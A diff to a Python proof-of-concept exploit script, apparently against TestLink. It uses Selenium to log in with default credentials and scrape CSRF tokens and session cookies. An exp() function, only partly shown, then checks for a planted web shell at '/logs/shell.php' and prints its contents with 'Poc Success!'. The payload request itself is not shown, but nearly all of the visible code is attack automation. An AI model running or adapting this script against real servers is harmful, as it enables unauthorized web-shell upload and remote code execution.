@@ -1,7 +1,8 @@
-import requests
 import sys
 import time
+import requests
 from selenium import webdriver
+from time import sleep
 from selenium.webdriver.support.ui import Select
 from selenium.webdriver.support.wait import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
@@ -14,25 +15,21 @@ def login(host):
     driver = webdriver.Firefox(options=firefox_opt)
     url = host + '/index.php'
     driver.get(url)
-    time.sleep(20)
-    #wait = WebDriverWait(driver, 60)
-    #wait.until(EC.element_to_be_clickable((By.ID, 'tl_login')))
+    time.sleep(10)
     driver.find_element_by_id("tl_login").clear()
-    driver.find_element_by_id("tl_login").send_keys("cuc")
+    driver.find_element_by_id("tl_login").send_keys("user")
     driver.find_element_by_id("tl_password").clear()
-    driver.find_element_by_id("tl_password").send_keys("cuc123")
+    driver.find_element_by_id("tl_password").send_keys("bitnami")
     driver.find_element_by_id("tl_login_button").click()
-    time.sleep(30)
-    #driver.switch_to.parent_frame()
+    time.sleep(10)
+    driver.switch_to.parent_frame()
+    time.sleep(10)
     driver.switch_to.frame("mainframe")
-    time.sleep(5)
     driver.find_element_by_xpath('/html/body/div[3]/div[2]/a[4]').click()
-    time.sleep(5)
     driver.find_element_by_xpath('/html/body/div/div/form/input[7]').click()
     csrfguard = driver.find_element_by_xpath('/html/body/div/form[1]/input[1]')
     csrfguard_name = csrfguard.get_attribute('name')
     csrfguard_value = csrfguard.get_attribute('value')
-    time.sleep(5)
     csrfname = driver.find_element_by_xpath('/html/body/div/form[1]/input[2]')
     csrf_name = csrfname.get_attribute('name')
     csrf_value = csrfname.get_attribute('value')
@@ -40,8 +37,6 @@ def login(host):
     cookie = driver.get_cookies()
     phpsession = cookie[0]['value']
     testlink_cookie = cookie[1]['value']
-    print("phpsession:", phpsession)
-    print("testlink_cookie", testlink_cookie)
     f = open("temp", 'w+')
     print("{phpsession}".format(phpsession=phpsession), file=f)
     print("{testlink_cookie}".format(testlink_cookie=testlink_cookie), file=f)
@@ -94,11 +89,11 @@ def exp(host, phpsession, testlink_cookie, csrfguard_value, csrf_value):
     print("status_code",response.status_code)
     check = requests.get(host + '/logs/shell.php',
                              cookies=cookies, headers=headers)
-    print("shell content:",check.status_code)
+    print("shell content:",check.text)
     if check.status_code == 200:
         print("Poc Success!")
     else:
-        print("Poc failed!") 
+        print("Poc failed!")
 
 
 
